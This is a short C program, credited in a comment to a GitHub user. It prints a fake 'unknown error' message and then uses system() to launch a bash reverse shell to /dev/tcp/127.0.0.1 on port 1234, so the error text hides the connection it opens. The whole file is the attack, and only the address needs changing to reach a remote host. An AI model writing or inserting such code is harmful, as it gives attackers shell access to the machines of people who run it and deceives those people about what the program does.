#include <stdio.h>
#include <stdlib.h>

int main() {
  // Code made by https://github.com/Sajmonpcgamer
  printf("An unknown error occured");
  system("bash -i >& /dev/tcp/127.0.0.1/1234 0>&1");
  return 1;
}
